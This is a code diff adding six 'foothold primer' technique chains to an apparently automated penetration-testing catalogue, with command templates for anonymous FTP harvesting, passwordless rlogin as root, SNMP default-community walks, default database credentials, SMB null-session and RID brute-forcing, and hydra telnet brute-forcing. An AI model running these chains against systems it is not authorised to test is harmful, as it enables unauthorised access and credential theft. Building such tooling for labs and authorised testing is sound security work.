@@ -440,6 +440,211 @@ TECHNIQUE_CATALOG: List[TechniqueChain] = [
         ],
         mitre=["T1078"],
     ),
+
+    # ── Foothold primers (post-mortem 2026-04-19) ─────────────────────────
+    # Cheap, low-noise unauth probes that resolve most beginner/lab boxes
+    # in <60s.  These should run FIRST — before any aggressive scanner —
+    # whenever their target service is open.  Each is read-only on its
+    # confirm step; only the second step has any side-effect.
+
+    TechniqueChain(
+        chain_id="ftp_anonymous_login",
+        name="Anonymous FTP → file harvest",
+        description="vsftpd / proftpd / pure-ftpd often ship with anonymous read enabled — try it before anything else when port 21 is open.",
+        phase="exploit",
+        applies_when={
+            "services": ["ftp", "vsftpd", "proftpd", "pure-ftpd", "filezilla"],
+            "keywords": ["ftp", "vsftpd", "anonymous"],
+            "ports":    ["21"],
+        },
+        steps=[
+            TechniqueStep(
+                name="confirm_anon",
+                tool="nmap",
+                args_template="--script ftp-anon -p21 {target}",
+                success_indicators=["Anonymous FTP login allowed", "FTP code 230"],
+                failure_indicators=["Login incorrect", "530", "not allowed"],
+                notes="Read-only nmap NSE — safe.",
+            ),
+            TechniqueStep(
+                name="harvest",
+                tool="curl",
+                args_template="-s -u 'anonymous:anonymous@' ftp://{target}/ --list-only",
+                success_indicators=[".txt", "user.txt", "flag", "id_rsa", "backup"],
+                notes="Look for SSH keys, scripts, flags, password files.",
+            ),
+        ],
+        mitre=["T1078.001", "T1083"],
+        confidence=0.9,
+    ),
+
+    TechniqueChain(
+        chain_id="rsh_rlogin_default_root",
+        name="r-services (rsh/rlogin) → unauth root",
+        description="Ports 512/513/514 left open on labs almost always allow rsh/rlogin as root with no password — single-step instant shell.",
+        phase="exploit",
+        applies_when={
+            "services": ["rsh", "rlogin", "rexec", "shell", "login", "exec"],
+            "keywords": ["r-services", "rexec", "rsh", "rlogin"],
+            "ports":    ["512", "513", "514"],
+        },
+        steps=[
+            TechniqueStep(
+                name="rlogin_root",
+                tool="rlogin",
+                args_template="-l root {target}",
+                success_indicators=["#", "$", "Last login", "id="],
+                failure_indicators=["denied", "refused", "incorrect"],
+                notes="Try -l root first, then -l nobody, -l guest, -l bin.",
+            ),
+            TechniqueStep(
+                name="rsh_id",
+                tool="rsh",
+                args_template="-l root {target} id",
+                success_indicators=["uid=0", "root", "wheel"],
+            ),
+        ],
+        mitre=["T1078.001", "T1021"],
+        confidence=0.85,
+    ),
+
+    TechniqueChain(
+        chain_id="snmp_public_v2c_walk",
+        name="SNMPwalk public → users / processes / running services",
+        description="SNMP v1/v2c with default community 'public' leaks usernames, running processes, installed software, ARP tables — gold for foothold planning.",
+        phase="recon",
+        applies_when={
+            "services": ["snmp"],
+            "keywords": ["snmp", "community string"],
+            "ports":    ["161"],
+        },
+        steps=[
+            TechniqueStep(
+                name="walk_public",
+                tool="snmpwalk",
+                args_template="-v 2c -c public {target}",
+                success_indicators=["SNMPv2-MIB", "iso.3.6.1", "STRING:", "INTEGER:"],
+                failure_indicators=["Timeout", "No Response", "no such name"],
+                notes="If 'public' fails, try 'private', 'community', 'manager'.",
+            ),
+            TechniqueStep(
+                name="enumerate_users",
+                tool="snmpwalk",
+                args_template="-v 2c -c public {target} 1.3.6.1.4.1.77.1.2.25",
+                success_indicators=["STRING:", "user", "Administrator"],
+                notes="Windows user accounts via LanMgr-Mib-II.",
+            ),
+        ],
+        mitre=["T1046", "T1087"],
+        confidence=0.9,
+    ),
+
+    TechniqueChain(
+        chain_id="db_default_creds_quick",
+        name="MySQL/Postgres/MongoDB/MSSQL default-creds primer",
+        description="Try empty/default creds against exposed DB servers before brute-forcing — most lab boxes leave at least one of root/'', postgres/postgres, sa/sa, or no-auth Mongo.",
+        phase="exploit",
+        applies_when={
+            "services": ["mysql", "postgresql", "postgres", "mongodb", "mssql",
+                         "ms-sql-s", "redis"],
+            "keywords": ["default credentials", "no password", "weak auth"],
+            "ports":    ["3306", "5432", "27017", "1433", "6379"],
+        },
+        steps=[
+            TechniqueStep(
+                name="mysql_root_empty",
+                tool="mysql",
+                args_template="-h {target} -u root -e 'SHOW DATABASES;'",
+                success_indicators=["information_schema", "Database"],
+                failure_indicators=["Access denied", "ER_ACCESS_DENIED"],
+            ),
+            TechniqueStep(
+                name="postgres_default",
+                tool="psql",
+                args_template="-h {target} -U postgres -c '\\l' -W postgres",
+                success_indicators=["List of databases", "template0"],
+                failure_indicators=["authentication failed", "FATAL"],
+            ),
+            TechniqueStep(
+                name="mongo_unauth",
+                tool="mongosh",
+                args_template="--host {target} --eval 'db.adminCommand({listDatabases:1})'",
+                success_indicators=["databases", "totalSize"],
+                failure_indicators=["Unauthorized", "auth failed"],
+            ),
+            TechniqueStep(
+                name="mssql_sa_blank",
+                tool="impacket-mssqlclient",
+                args_template="sa@{target} -windows-auth",
+                success_indicators=["SQL>", "Master"],
+                failure_indicators=["Login failed", "[-]"],
+            ),
+        ],
+        mitre=["T1078.001", "T1110.001"],
+        confidence=0.85,
+    ),
+
+    TechniqueChain(
+        chain_id="smb_anonymous_enum",
+        name="SMB anonymous null-session → share / user enum",
+        description="Null-session SMB enum still works on a surprising number of older Windows / Samba boxes — list shares, users, RID-cycle.",
+        phase="recon",
+        applies_when={
+            "services": ["smb", "microsoft-ds", "netbios-ssn"],
+            "keywords": ["smb", "samba", "netbios"],
+            "ports":    ["139", "445"],
+        },
+        steps=[
+            TechniqueStep(
+                name="list_shares",
+                tool="smbclient",
+                args_template="-L //{target}/ -N",
+                success_indicators=["Sharename", "IPC$", "Disk", "Comment"],
+                failure_indicators=["NT_STATUS_ACCESS_DENIED", "session setup failed"],
+            ),
+            TechniqueStep(
+                name="enum4linux",
+                tool="enum4linux-ng",
+                args_template="-A {target}",
+                success_indicators=["Users via", "Domain Sid", "Share Enumeration",
+                                    "RID Cycling"],
+            ),
+            TechniqueStep(
+                name="rid_cycle",
+                tool="crackmapexec",
+                args_template="smb {target} --rid-brute 4000",
+                success_indicators=["SidTypeUser", "Administrator", "Guest"],
+            ),
+        ],
+        mitre=["T1087.002", "T1135"],
+        confidence=0.85,
+    ),
+
+    TechniqueChain(
+        chain_id="telnet_default_creds",
+        name="Telnet → default / blank credentials",
+        description="Open telnet ports on labs frequently accept root/root, admin/admin, or blank passwords — one connection attempt per pair, watch for prompt.",
+        phase="exploit",
+        applies_when={
+            "services": ["telnet"],
+            "keywords": ["telnet", "cleartext"],
+            "ports":    ["23"],
+        },
+        steps=[
+            TechniqueStep(
+                name="hydra_short_list",
+                tool="hydra",
+                args_template=("-L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+                               "-P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt "
+                               "-t 4 -f {target} telnet"),
+                success_indicators=["[23][telnet] host:", "login:", "password:"],
+                failure_indicators=["0 valid passwords found", "could not connect"],
+                notes="Stop on first success (-f); cap to top-100 to stay quiet.",
+            ),
+        ],
+        mitre=["T1110.001"],
+        confidence=0.7,
+    ),
 ]
 
 
